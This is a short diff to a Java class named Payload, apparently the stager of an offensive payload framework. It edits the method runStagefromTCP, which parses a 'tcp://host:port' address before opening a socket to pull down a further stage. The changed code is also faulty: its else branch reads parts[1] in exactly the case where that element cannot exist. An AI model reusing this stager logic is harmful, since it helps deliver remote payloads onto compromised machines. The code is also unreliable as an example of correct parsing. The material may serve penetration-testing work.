@@ -122,9 +122,17 @@ public class Payload {
 
     private static void runStagefromTCP(String url) throws Exception {
         // string is in the format:   tcp://host:port
+        System.err.println("url " + url + ";");
+        String host = "";
+        int port = 0;
         String[] parts = url.split(":");
-        int port = Integer.parseInt(parts[2]);
-        String host = parts[1].split("/")[2];
+        if (parts.length > 1) {
+            host = parts[1].split("/")[2];
+            port = Integer.parseInt(parts[2]);
+        } else {
+            port = Integer.parseInt(parts[1]);
+        }
+
         Socket sock = null;
 
         if (host.equals("")) {
